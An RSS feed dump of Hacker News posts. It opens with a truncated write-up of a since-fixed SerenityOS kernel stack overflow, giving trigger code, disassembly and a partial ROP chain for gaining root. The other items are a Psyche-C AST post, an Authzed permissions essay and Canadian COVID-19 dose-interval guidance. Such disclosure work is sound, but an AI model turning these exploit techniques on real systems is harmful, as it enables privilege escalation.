March 5, 2021 | https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/ | <a href="https://web.archive.org/web/*/https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Memory corruption to root privileges.</p><div>
        <p><img src="https://styles.redditmedia.com/t5_11p1s4/styles/communityIcon_82qz1x1k5uj41.png" alt="SerenityOS Logo"></p>

<p>Recently I have taken an interest in a project called SerenityOS. Stolen straight from the <a href="https://github.com/SerenityOS/serenity">GitHub</a>:</p>
<blockquote>
<p>SerenityOS is a love letter to ’90s user interfaces with a custom Unix-like core. It flatters with sincerity by stealing beautiful ideas from various other systems.</p>
<p>Roughly speaking, the goal is a marriage between the aesthetic of late-1990s productivity software and the power-user accessibility of late-2000s *nix. This is a system by us, for us, based on the things we like.</p>
</blockquote>
<p>It’s a surprisingly featured hobby operating system with quite a welcoming community behind it. It caught my radar after a series of videos by LiveOverflow and Andreas (the developer) detailing a few exploits made during the <a href="https://hxp.io/blog/79/hxp-CTF-2020-wisdom2/">2020 hxp CTF</a>, so I decided to explore the system myself. Eventually, I found a memory corruption bug in some networking code that could be leveraged into kernel-mode code execution.</p>

<p>The vulnerability can be hit so easily by some bad code that I’m surprised it wasn’t found by a fuzzer immediately. At its core, it’s a stack overflow in the function <code>TCPSocket::send_tcp_packet</code>. To see how, let’s take a look at the implementation.</p>
<div><pre><code data-lang="cpp">KResult TCPSocket<span>::</span>send_tcp_packet(u16 flags, <span>const</span> UserOrKernelBuffer<span>*</span> payload, size_t payload_size)
{
    <span>const</span> size_t buffer_size <span>=</span> <span>sizeof</span>(TCPPacket) <span>+</span> payload_size;
    <span>alignas</span>(TCPPacket) u8 buffer[buffer_size];
    <span>new</span> (buffer) TCPPacket;
    <span>auto</span><span>&amp;</span> tcp_packet <span>=</span> <span>*</span>(TCPPacket<span>*</span>)(buffer);
    ASSERT(local_port());
    tcp_packet.set_source_port(local_port());
    tcp_packet.set_destination_port(peer_port());
    tcp_packet.set_window_size(<span>1024</span>);
    tcp_packet.set_sequence_number(m_sequence_number);
    tcp_packet.set_data_offset(<span>sizeof</span>(TCPPacket) <span>/</span> <span>sizeof</span>(u32));
    tcp_packet.set_flags(flags);
    <span>//...
</span><span></span>    <span>if</span> (payload <span>&amp;&amp;</span> <span>!</span>payload<span>-&gt;</span>read(tcp_packet.payload(), payload_size))
        <span>return</span> EFAULT;
    <span>//...
</span><span></span>    <span>if</span> (tcp_packet.has_syn() <span>||</span> payload_size <span>&gt;</span> <span>0</span>) {
        <span>//...
</span><span></span>        send_outgoing_packets();
        <span>return</span> KSuccess;
    }
    <span>//...
</span><span></span>}
</code></pre></div><p>This function is called when attempting to use the <code>send()</code> syscall on a TCP socket (naturally). None of the parent callers in the chain (<code>Process::sys$sendmsg</code>, <code>IPv4Socket::sendto</code>, and <code>TCPSocket::protocol_send</code>) do any bounds checking on the user-provided <code>payload_size</code> other than ensuring the value is in userspace. Unfortunately, a value being in userspace is quite a lax requirement when then using the value to make a stack allocation. The problem line is:</p>
<div><pre><code data-lang="cpp"><span>alignas</span>(TCPPacket) u8 buffer[buffer_size];
</code></pre></div><p><code>buffer</code> is then a Variable-length Array (<a href="https://en.wikipedia.org/wiki/Variable-length_array">VLA</a>) which is a really cursed feature from C99 that is as bad as it sounds. It attempts to dynamically resize the stack-frame using the value we provided, which can do some very unexpected things when the value is larger than the stack size (Serenity seems to use a stack size of 2^16 in the kernel). We can thus easily obliterate the stack and trigger a crash by calling something to the effect of:</p>
<div><pre><code data-lang="cpp">send(tcp_socket, user_buffer, <span>0xdeadaa</span>, <span>0</span>); <span>//BOOM!
</span></code></pre></div><p>This is all well and good, but can we actually do something useful with this? First and foremost, we need to make sure there’s no funny business going on with the allocation itself. Examining the code produced by gcc:</p>
<div><pre><code data-lang="r"><span>...</span>
<span>&lt;</span><span>+749</span><span>&gt;:</span> test   eax,eax
<span>&lt;</span><span>+751</span><span>&gt;:</span> jg     <span>0xc018a36f</span> <span>&lt;</span>Kernel<span>::</span>TCPSocket<span>::</span><span>send_tcp_packet</span>(unsigned short, Kernel<span>::</span>UserOrKernelBuffer const<span>*</span>, unsigned long)<span>+771</span><span>&gt;</span>
<span>&lt;</span><span>+753</span><span>&gt;:</span> push   edx
<span>&lt;</span><span>+754</span><span>&gt;:</span> push   edx
<span>&lt;</span><span>+755</span><span>&gt;:</span> push   eax
<span>&lt;</span><span>+756</span><span>&gt;:</span> lea    eax,[ebx<span>+0</span>x1c3be4]
<span>&lt;</span><span>+762</span><span>&gt;:</span> push   eax
<span>&lt;</span><span>+763</span><span>&gt;:</span> call   <span>0xc01e08e2</span> <span>&lt;</span><span>__ubsan_handle_vla_bound_not_positive</span>()<span>&gt;</span>
<span>&lt;</span><span>+768</span><span>&gt;:</span> add    esp,<span>0x10</span>
<span>&lt;</span><span>+771</span><span>&gt;:</span> mov    eax,DWORD PTR [ebp<span>-0</span>x70]
<span>&lt;</span><span>+774</span><span>&gt;:</span> lea    esi,[ebp<span>-0</span>x58]
<span>&lt;</span><span>+777</span><span>&gt;:</span> add    eax,<span>0xf</span>
<span>&lt;</span><span>+780</span><span>&gt;:</span> and    eax,<span>0xfffffff0</span>
<span>&lt;</span><span>+783</span><span>&gt;:</span> sub    esp,eax
<span>&lt;</span><span>+785</span><span>&gt;:</span> lea    eax,[ebp<span>-0</span>x70]
<span>...</span>
</code></pre></div><p>Seems to do exactly as advertised, just a <code>sub esp</code> with our value (and with the shiny UB sanitizer attached). So now that we can be confident the allocation won’t mess with any memory, the next step is using it safely. Nearly right after the allocation, we have our userspace buffer being copied into the kernel buffer:</p>
<div><pre><code data-lang="cpp"><span>if</span> (payload <span>&amp;&amp;</span> <span>!</span>payload<span>-&gt;</span>read(tcp_packet.payload(), payload_size))
    <span>return</span> EFAULT;
</code></pre></div><p>This could be bad news for us <em>if</em> we provide a valid-sized user buffer because then we’d at the very least hit the guard page below the stack and fail. But that’s a big <em>if</em>. Providing a non-valid user buffer is totally fair game, too. How would the kernel know? What I mean by this is that our buffer isn’t as long as we say it is. The result is that as <code>payload-&gt;read</code> attempts to copy over our bytes, it’ll fault when it hits our bad memory. But this time, the fault will be on the <em>user side</em>, meaning the function will gracefully exit on the kernel’s end.</p>
<div><pre><code data-lang="cpp">u8<span>*</span> stack_smash <span>=</span> (u8<span>*</span>)mmap(<span>nullptr</span>, ST_BUFFER_LEN, PROT_READ <span>|</span> PROT_WRITE, MAP_SHARED <span>|</span> MAP_ANONYMOUS, <span>-</span><span>1</span>, <span>0</span>);
...
send(socket_fd, stack_smash, send_len, <span>0</span>); <span>//send_len is much, much larger than ST_BUFFER_LEN!
</span></code></pre></div><p><a href="https://twitter.com/patrickwardle">@patrickwardle</a> has a nice visual of this regarding a similar idea on macOS:</p>
<p><img src="https://pbs.twimg.com/media/EvYgh2MVIAYT_8I?format=jpg&amp;name=large" alt="macOS partial write"></p>
<p>This is wonderful, as this chain of events means we have:</p>
<ul>
<li>A <code>sub esp</code> with a user-controlled value</li>
<li>An arbitrary write with another user-controlled value/length</li>
<li>A graceful exit</li>
</ul>
<p>I reported the <a href="https://github.com/SerenityOS/serenity/issues/5310">issue</a> and it was fixed within 15 minutes. This guy is a beast!</p>
<p>Now we have all the tools necessary to exploit this :)</p>

<p>We have essentially what is an arbitrary write primitive, so first we must choose what we want to write to. We have to keep in mind that we are writing from an offset from the stack, though, which might make things a little unpredictable. Thankfully, there is little to no KASLR on the system (as far as I’ve seen) but general system noise and randomness make specific writes fairly difficult. That makes directly writing to a critical structure out of the question, but what about staying in the realm of the stack? As the bug is a stack overflow we can’t write to anything already on our stack (as it continues to grow downwards), but I did notice the offsets between stacks seems to remain constant:</p>
<div><pre><code data-lang="cs">...
<span>[#0 SystemServer(5:5)]</span>: Created kernel stack: <span>0</span>xc35df000
<span>[#0 SystemServer(5:5)]</span>: Created kernel stack: <span>0</span>xc35f0000
<span>[#0 SystemServer(5:5)]</span>: Created kernel stack: <span>0</span>xc3601000
<span>[#0 SystemServer(5:5)]</span>: Created kernel stack: <span>0</span>xc3612000
...
</code></pre></div><p>The offset is 0x11000, which is just the stack size 0x10000 plus the guard page size 0x1000. And so, if we can’t write to our own stack… we can still write to another process stack fairly reliably. It then just becomes a case of winning a race condition between what the other process is doing and the write that we do. This is not a problem however as we control the ‘victim’ process, so we can just make it do something as trivial as call sleep, giving us an arbitrary race window. There is also one final annoyance of some randomization that is done whenever we call a syscall:</p>
<div><pre><code data-lang="cpp"><span>// Apply a random offset in the range 0-255 to the stack pointer,
</span><span>// to make kernel stacks a bit less deterministic.
</span><span>// Since this is very hot code, request random data in chunks instead of
</span><span>// one byte at a time. This is a noticeable speedup.
</span><span></span><span>if</span> (g_random_byte_buffer_offset <span>==</span> RandomByteBufferSize) {
    get_fast_random_bytes(g_random_byte_buffer, RandomByteBufferSize);
    g_random_byte_buffer_offset <span>=</span> <span>0</span>;
}
</code></pre></div><p>This slight randomization to the stack bases makes writing to an exact address of the victim’s stack unreliable (granted, it could be brute-forced in a millisecond). But once again the stars align as the sleep syscall does not care very much about how the stack is laid out as it returns. During its call, it eventually reaches the function <code>Processor::switch_context</code>, which is the final stage before swapping contexts. In it, it does:</p>
<div><pre><code data-lang="r"><span>...</span>
<span>&lt;</span><span>+159</span><span>&gt;:</span> pushf  
<span>&lt;</span><span>+160</span><span>&gt;:</span> push   ebx
<span>&lt;</span><span>+161</span><span>&gt;:</span> push   esi
<span>&lt;</span><span>+162</span><span>&gt;:</span> push   edi
<span>&lt;</span><span>+163</span><span>&gt;:</span> push   ebp
<span>...</span>
<span>&lt;</span><span>+186</span><span>&gt;:</span> push   eax
<span>&lt;</span><span>+187</span><span>&gt;:</span> push   edx
<span>&lt;</span><span>+188</span><span>&gt;:</span> push   ecx
<span>&lt;</span><span>+189</span><span>&gt;:</span> cld    
<span>&lt;</span><span>+190</span><span>&gt;:</span> jmp    <span>0xc011b7d4</span> <span>&lt;</span><span>enter_thread_context</span>()<span>&gt;</span>
<span>&lt;</span><span>+195</span><span>&gt;:</span> pop    edx
<span>&lt;</span><span>+196</span><span>&gt;:</span> pop    eax
<span>&lt;</span><span>+197</span><span>&gt;:</span> pop    ebp
<span>&lt;</span><span>+198</span><span>&gt;:</span> pop    edi
<span>&lt;</span><span>+199</span><span>&gt;:</span> pop    esi
<span>&lt;</span><span>+200</span><span>&gt;:</span> pop    ebx
<span>&lt;</span><span>+201</span><span>&gt;:</span> popf   
<span>...</span>
<span>&lt;</span><span>+225</span><span>&gt;:</span> lea    esp,[ebp<span>-0</span>xc]
<span>&lt;</span><span>+228</span><span>&gt;:</span> pop    ebx
<span>&lt;</span><span>+229</span><span>&gt;:</span> pop    esi
<span>&lt;</span><span>+230</span><span>&gt;:</span> pop    edi
<span>&lt;</span><span>+231</span><span>&gt;:</span> pop    ebp
<span>&lt;</span><span>+232</span><span>&gt;:</span> ret    
<span>...</span>
</code></pre></div><p>Pretty much saving the state and restoring it afterwards. Crucially, it loads <code>esp</code> with a value on the stack, then returns shortly after. Accuracy doesn’t matter here, we can just spray the stack with a new stack pointer and have it return from there… code execution! At this point, we just need to put a ROP chain in some kernel memory and have the stack be redirected to there. I chose to just spray some heap memory with the ROP, but this part was extremely iffy. The offset between the current stack and the heap is not something I could reasonably predict so I had to pretty much blast the entire heap with the code. I used something like a nop sled but with a bunch of rets instead (a ret sled?) to make the ROP chain execution reliable but it would still crash half the time if the offset was too large and I wrote to some bad memory. There’s probably a better way to store the ROP but for my purposes, it will suffice.</p>
<p>The ROP chain I ended up with was very similar to the one in vakzz’s awesome <a href="https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">exploit chain</a>, writing root to our processes permission bits.</p>
<div><pre><code data-lang="cpp">write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0157c1e</span>); <span>//pop eax; ret;
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0811000</span>); <span>//heap
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc011ccdc</span>); <span>//pop edx; ret;
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0xc02289ef</span>); <span>//Kernell::process::current()
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc019092e</span>); <span>//mov dw [eax], edx; ret;
</span><span></span>
pad(heap_smash, <span>&amp;</span>off, <span>0x41414141</span>);       <span>//stack padding
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0157cec</span>); <span>//pop edi; pop ebp; ret;
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0811018</span>); <span>//heap+0x18 
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0x00000000</span>); <span>//dummy 
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0195672</span>); <span>//call dw [edi - 0x18]; ret;
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc011ccdc</span>); <span>//pop edx; ret;
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0x00000038</span>); <span>//uid offset
</span><span></span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/">https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/</a></em></p>]]>
            </description>
            <link>https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26361085</guid>
            <pubDate>Fri, 05 Mar 2021 19:36:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dumping a C program’s AST with Psyche-C]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26361011">thread link</a>) | @EntICOnc
<br/>
March 5, 2021 | https://ltcmelo.github.io/psychec/2021/03/03/c-ast-dump-psyche.html | <a href="https://web.archive.org/web/*/https://ltcmelo.github.io/psychec/2021/03/03/c-ast-dump-psyche.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      

<p>Given that the Psyche-C compiler frontend is being renewed, I decided to start a blog about the project. This is my first post.</p>

<p>Without further ado, consider this C program (assume that its name is <code>test.c</code>):</p>

<div><div><pre><code><span>int</span> <span>v</span><span>,</span> <span>f</span><span>(</span><span>int</span> <span>d</span><span>);</span>

<span>int</span> <span>f</span><span>(</span><span>int</span> <span>p</span><span>)</span>
<span>{</span>
    <span>if</span> <span>(</span><span>p</span> <span>==</span> <span>v</span><span>)</span>
        <span>return</span><span>(</span><span>p</span> <span>-</span> <span>1</span><span>);</span>
    <span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>To produce and dump an AST with Psyche-C, we invoke the <em>cnippet</em> driver adaptor with command line option <code>--C-dump-AST</code>. The output is as follows:</p>

<p><img width="609" alt="Screen Shot 2021-03-03 at 20 56 16" src="https://user-images.githubusercontent.com/2905588/109888794-e8d75f00-7c62-11eb-98bc-c62247df0c3e.png"></p>

<p>Now, I’ll briefly correlate the above AST with the one produced by <a href="https://clang.llvm.org/">Clang</a> for the same <code>test.c</code> program. Let’s take a look at it:</p>

<p><img width="789" alt="Screen Shot 2021-03-03 at 21 03 44" src="https://user-images.githubusercontent.com/2905588/109889407-17096e80-7c64-11eb-9ecd-b0bd56af902e.png"></p>

<p>Apart from the colors and extra decoration, what are the main differences between the two?</p>

<ul>
  <li><em>It’s that Psyche-C’s AST is a bit closer to the grammar of C.</em> For instance, you can’t see <em>declarator</em>s in Clang’s AST, they are absorbed by their containing <em>declaration</em>s.</li>
</ul>

<p>Whether or not this characteristic is good or bad will depend on a given application. For the purpose of static analysis implementation, I consider the refined syntax insights of Psyche-C’s AST an advantage.</p>

<p>I’m not saying that every <em>node</em> in a AST should correspond to a <em>terminal</em> of the grammar. If so, we’d end up with a rather <strong>concrete</strong> syntax (or parse) tree, instead of an <strong>abstract</strong> syntax tree. A comprehensible AST will contain just enough of a language’s meaning embedded into it. (The AST produced by the <a href="https://github.com/ltcmelo/psychec/tree/original">old parser of Psyche-C</a>, e.g., was too grammar-oriented.)</p>

<p>Consider this snippet from our <code>test.c</code> program:</p>



<p>In Clang’s AST, it’s represented through a <code>VarDecl</code> and a <code>FunctionDecl</code>; both these nodes <a href="https://clang.llvm.org/doxygen/classclang_1_1DeclaratorDecl.html">inherit from</a> <code>DeclaratorDecl</code> (i.e., a <em>declaration</em> with a <em>declarator</em>). But, in pedantic terms, that representation isn’t quite correct, given that a single <em>declaration</em> — one starting at <code>int</code> and ending at <code>;</code> — exists in that snippet.</p>

<p>In Psyche-C, I opted for a more rigorous representation in the AST:</p>

<ul>
  <li>A <code>VariableAndOrFunctionDeclaration</code> is created (just like Clang, this node <a href="https://ltcmelo.github.io/psychec/api-docs/html/classpsy_1_1_c_1_1_variable_and_or_function_declaration_syntax.html">inherits from</a> a <code>DeclaratorDeclaration</code>) with two child nodes: an <code>IdentifierDeclarator</code>, designating object of type <code>int</code>, and a <code>FunctionDeclarator</code>, designating a function whose return type is <code>int</code>. This choice makes the AST rewritable with accuracy as well.</li>
</ul>

<p>In general, the design “spirit” of Psyche-C’s AST is more aligned with that of <a href="https://github.com/dotnet/roslyn">Roslyn</a>, the .NET compiler platform. Although, because Psyche-C is a frontend for C, its AST will, of course, resembles that of Clang.</p>

<p>To wrap up, I’ll leave a C# version of <code>test.c</code> (well, <code>test.cs</code>), together with its AST.</p>

<p><img width="837" alt="Screen Shot 2021-03-03 at 23 15 17" src="https://user-images.githubusercontent.com/2905588/109900632-753f4d00-7c76-11eb-9d61-6b3e278ec132.png"></p>

<p>Screenshot from <a href="https://sharplab.io/">SharpLab</a>.</p>



      
    </section></div>]]>
            </description>
            <link>https://ltcmelo.github.io/psychec/2021/03/03/c-ast-dump-psyche.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26361011</guid>
            <pubDate>Fri, 05 Mar 2021 19:30:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Identity Is Not the Foundation of Permission Systems]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26360811">thread link</a>) | @jzelinskie
<br/>
March 5, 2021 | https://authzed.com/blog/identity-isnt-the-foundation/ | <a href="https://web.archive.org/web/*/https://authzed.com/blog/identity-isnt-the-foundation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Have you ever chatted with a fellow developer about an application’s permission system and quickly realized you’re also talking about its login system?
It’s rather unfortunate, but these two entirely distinct systems often get merged together simply because their formal names start with the same four letters: <strong>AUTH</strong>.</p><blockquote><p>Authentication (“authN” or “identity”) is who you are</p><p>Authorization (“authZ” or “permissions” or “access control”) is what you’re allowed to do</p></blockquote><p>This is no amateur mistake.
Even <a href="https://docs.djangoproject.com/en/3.1/ref/contrib/auth/">major web frameworks</a> bundle these concepts together out of convenience.</p><p>Because so many applications need to support users from inception, identity becomes vital for developers to understand on day one.
However, building a robust permission system can usually be deferred until users start demanding it.
When requests for fine grained access control inevitably start pouring in, they often come alongside feature requests for integrations with various <a href="https://en.wikipedia.org/wiki/Identity_provider">Identity Providers</a>.
This makes it seem natural to assume that the permission systems should be direct integrations with the primitives that the Identity Providers expose.
However, the <em>authorization</em> functionality that is often found in most <em>authentication</em> systems is generally overly simplistic and the resulting permission systems that are built on top are usually fragile and error prone.</p><p>This is the last thing you want to hear when discussing software that determines whether or not a user has access to sensitive content.
If you’re thinking “that’s only if you work in a domain, like healthcare or government, where you know sophisticated access control is required”, you should consider that even in simple use cases you’ll likely be iterating on your design, which gives you ample opportunities to introduce bugs that manifest themselves as security vulnerabilities.</p><h2 id="ldap-flips-conways-law-on-its-head">LDAP flips Conway’s Law on its head</h2><blockquote><p>Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure.</p><p>— Melvin E. Conway</p></blockquote><p>Conway’s Law describes how the architecture of software is a reflection of the organization of the people that built it.
For example, software components that are decoupled, but belong to the same application are often separate only because they were built by separate teams.</p><p>When permission systems are based on Identity Providers, this law is entirely reversed.</p><p>If an organization of people cannot use any software because everything, for example, only supports a structure that can be modeled by <a href="https://ldapwiki.com/wiki/Groups%20Are%20Bad">LDAP Groups</a>, it forces the people to reorganize into something that can be modeled by LDAP Groups.</p><p>This may be viable for organizations like businesses (the reorgs will continue until morale improves!), but obviously not all software can demand that their users reorganize just to use their product.</p><h2 id="groups-scopes-claims-dont-answer-the-question">Groups, Scopes, Claims don’t answer the question</h2><p>LDAP Groups, OAuth Scopes, SAML Claims, JWT Claims: all a rose by any other name.
These concepts all represent the same kind of data: an <em><a href="https://docs.authzed.com/authz/abac">attribute</a></em> that is stored on a user, indicating something about that user.
Attributes are useful: they can provide context about a user (such as an object they can access, or a role that the user has), which makes such a system, in theory, a reasonable solution to determining what a user can access.
However, in practice, developers realize that this isn’t quite so obvious once they have started working with this data.</p><p>Software that relies on these concepts for permissions all struggle in the same core principle: how they choose to interpret and apply significance to the presence of an attribute:</p><ul><li>If a user has both the “admin” and the “banned” attribute, what is the correct action?</li><li>Should admins be able to ignore bans or was the employee just fired from the company?</li><li>What about attributes that imply other attributes?</li><li>Does being “admin” also imply “write” access to this resource?</li></ul><p>You can see how this quickly gets out of hand.
And once it’s been decided how attributes should be properly interpreted, it’s time to audit every other application and make sure they interpret the attribute the exact same way or else you might have a security problem!</p><p>Now, there is nothing fundamentally wrong with attribute-based permission systems.
In fact, mature permission systems are almost always a fusion of ideas from <a href="https://docs.authzed.com/authz/what-else">various models</a> based on the requirements at hand.
In this case, how the attributes from <em>authentication</em> systems manifest themselves when they become the foundation of a permission system is the problem.
This is because attributes can only state facts about an identity.
But what we really need is the answer to the question “can this subject take this action on this resource?”.</p><h2 id="permissions-are-about-your-relationships">Permissions are about your relationships</h2><p>While identity is required to ask the question “Does this <code>subject</code> have permission to do this <code>action</code> to this <code>object</code>?”, it is not the <em>only</em> variable.
Identity sits alongside the <em>action</em> and the <em>object</em>.
That’s all well and good, but how <em>should</em> one arrive at the answer to one of these questions?</p><p>A great place to start is to crack open a social network like Facebook.
Go review (and probably update) your privacy settings; you’ll find a variety of configurations for sharing your content like friends-only or friends-of-friends.
When you change that setting, you’ll find that it applies instantaneously; there is no migration happening in their backend where thousands of users are granted the attribute to view your content.
This is because Facebook is designed to store and query <em>relationships</em> between their users.
Facebook is powered by a social <em>graph</em>.</p><p>If we lean on the idea of modeling relationships, like Facebook does, you can change the question from “Does X have permission to do Y to Z?” into “Does X have the relationship Y with Z?”.
For example, “Does User #123 have the Write relationship with Document #456?”.
Recall the example from reading attributes where the application has to decide if the “admin” attribute also implies the “write” attribute.
In a relationship-based model, this problem disappears because these are just more relationships:</p><figure><img src="https://authzed.com/images/blogs/identity-isnt-the-foundation/admin.png" alt="A graph displaying a path from a document to a user by passing through a write relationship and then an admin relationship."><figcaption><em>Users with the Admin relationship transitively have the Write relationship</em></figcaption></figure><p>The beauty of a relationship-based system is that the application doesn’t care <em>how</em> the user got to the Write relationship.
Maybe they’re the user that created the document.
Maybe the user had some kind of admin relationship that gives them the ability to do everything.
It doesn’t matter as long as there is some path through our relationship graph from the user to the Write relationship on the document.</p><figure><img src="https://authzed.com/images/blogs/identity-isnt-the-foundation/who%20cares.png" alt="A graph displaying a path from a document to a user by passing through the write relationship and then many unknown and complex relationships."><figcaption><em>Who cares how the user has the Write relationship?</em></figcaption></figure><p>This means that relationships can change (like changing your privacy settings) and applications will not need to have their code rewritten because there was no longer anything left open to interpretation.</p><h2 id="restoring-conways-law">Restoring Conway’s Law</h2><p>By realizing that permissions systems are fundamentally coupled to the <em>relationships</em> between people and objects in our software, we can build systems that mimic the way people naturally organize their world to be most effective.
This not only empowers the people consuming the software, but leads developers to arrive at more robust permission systems that can withstand changes to the organization.</p><p>If you’re left wondering what a permission system based on relationships looks like in practice, <a href="https://authzed.com/">Authzed</a> is exactly that!
We’re currently working hands-on with customers to help them understand and migrate to a better permission system.
If adding or refactoring permissions to support new functionality in your app is next on your roadmap, <a href="https://authzed.com/inquire">reach out to us</a>.</p></div></div>]]>
            </description>
            <link>https://authzed.com/blog/identity-isnt-the-foundation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26360811</guid>
            <pubDate>Fri, 05 Mar 2021 19:12:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SVG Tetris]]>
            </title>
            <description>
<![CDATA[
Score 82 | Comments 16 (<a href="https://news.ycombinator.com/item?id=26360716">thread link</a>) | @marcodiego
<br/>
March 5, 2021 | https://www.xul.fr/svgtetris.svg | <a href="https://web.archive.org/web/*/https://www.xul.fr/svgtetris.svg">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.xul.fr/svgtetris.svg</link>
            <guid isPermaLink="false">hacker-news-small-sites-26360716</guid>
            <pubDate>Fri, 05 Mar 2021 19:07:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Canadian government switches to support for first doses first]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26360556">thread link</a>) | @monkeypizza
<br/>
March 5, 2021 | https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/rapid-response-extended-dose-intervals-covid-19-vaccines-early-rollout-population-protection.html | <a href="https://web.archive.org/web/*/https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/rapid-response-extended-dose-intervals-covid-19-vaccines-early-rollout-population-protection.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


    
    <h2>On this page</h2>
<ul>
	<li><a href="#a1">Preamble</a></li>
	<li><a href="#a2">Summary</a></li>
	<li><a href="#a3">Introduction</a></li>
	<li><a href="#a4">Methods</a></li>
	<li><a href="#a5">Recommendations</a></li>
	<li><a href="#a6">Summary of rationale</a></li>
	<li><a href="#a7">Acknowledgments</a></li>
</ul>
<h2 id="a1">Preamble</h2>
<p>The National Advisory Committee on Immunization (NACI) is an External Advisory Body that provides the Public Health Agency of Canada (PHAC) with independent, ongoing and timely medical, scientific, and public health advice in response to questions from PHAC relating to immunization.</p>
<p>In addition to burden of disease and vaccine characteristics, PHAC has expanded the mandate of NACI to include the systematic consideration of programmatic factors in developing evidence-based recommendations to facilitate timely decision-making for publicly funded vaccine programs at provincial and territorial levels.</p>
<p>The additional factors to be systematically considered by NACI include: economics, ethics, equity, feasibility, and acceptability. Not all NACI Statements will require in-depth analyses of all programmatic factors. While systematic consideration of programmatic factors will be conducted using evidence-informed tools to identify distinct issues that could impact decision-making for recommendation development, only distinct issues identified as being specific to the vaccine or vaccine-preventable disease will be included.</p>
<p>This statement contains NACI's independent advice and recommendations, which are based upon the best current available scientific knowledge.</p>
<p>This document is being disseminated for information purposes. People administering the vaccine should also be aware of the contents of the relevant product monograph(s). Recommendations for use and other information set out herein may differ from that set out in the product monograph(s) of the Canadian manufacturer(s) of the vaccines. Manufacturer(s) have sought approval of the vaccines and provided evidence as to its safety and efficacy only when it is used in accordance with the product monographs. NACI members and liaison members conduct themselves within the context of PHAC's Policy on Conflict of Interest, including yearly declaration of potential conflict of interest.</p>
<h2 id="a2">Summary</h2>
<ul>
	<li>NACI has considered evidence from recent scientific studies on efficacy and effectiveness of COVID-19 vaccines in preventing various health outcomes such as infection, symptomatic disease, hospitalizations and death from COVID-19.</li>
	<li>While studies have not yet collected four months of data on vaccine effectiveness after the first dose, the first two months of real world effectiveness are showing sustained high levels of protection.</li>
	<li>Short term sustained protection is consistent with immunological principles and vaccine science where it is not expected to see rapid waning of a highly effective vaccine in adults over a relatively short period of time.&nbsp;Extending the interval between doses was shown to be a good strategy through modelling, even in scenarios considering a six month interval and in theoretical scenarios where waning protection was considered.</li>
	<li>NACI recommends that in the context of limited COVID-19 vaccine supply, jurisdictions should maximize the number of individuals benefiting from the first dose of vaccine by extending the interval for the second dose of vaccine up to four months.</li>
	<li>Extending the dose interval to four months allows NACI to create opportunities for protection of the entire adult population within a short timeframe. This will not only achieve protection of the adult population, but will also contribute to health equity.</li>
	<li>NACI will continue to monitor the evidence on effectiveness of extended dose intervals and will adjust recommendations as needed.</li>
</ul>
<h2 id="a3">Introduction</h2>
<p>Since COVID-19 vaccines were first authorized in Canada in December 2020, the National Advisory Committee on Immunization (NACI) has been providing evidence-informed guidance on the recommended interval between vaccine doses. In the most recent update, January 12, 2021, NACI provided advice on extending intervals for mRNA vaccines to six weeks. In February 2021, the Public Health Agency of Canada (PHAC) asked NACI to address the following context and question: Due to limited vaccine supply and logistical challenges, jurisdictions need to implement COVID-19 mRNA vaccine intervals beyond six weeks. Given emerging evidence as mRNA vaccines are rolled out to populations in Canada and elsewhere in the world, what extended interval would be recommended in order to balance individual protection and population impact? Are extended intervals a particular concern for any key populations?</p>
<h3 id="a3.1">Guidance objective</h3>
<p>The objective of this bulletin is to provide guidance for the equitable, ethical, and efficient allocation of authorized COVID-19 vaccines in the context of staggered arrival of vaccine supply. This guidance builds on the foundational framework of NACI's <a href="https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/recommendations-use-covid-19-vaccines.html">Recommendations on the use of COVID-19 vaccines</a>. The goal of Canada's pandemic response is to minimize serious illness and death while minimizing societal disruption as a result of the COVID-19 pandemic.</p>
<h2 id="a4">Methods</h2>
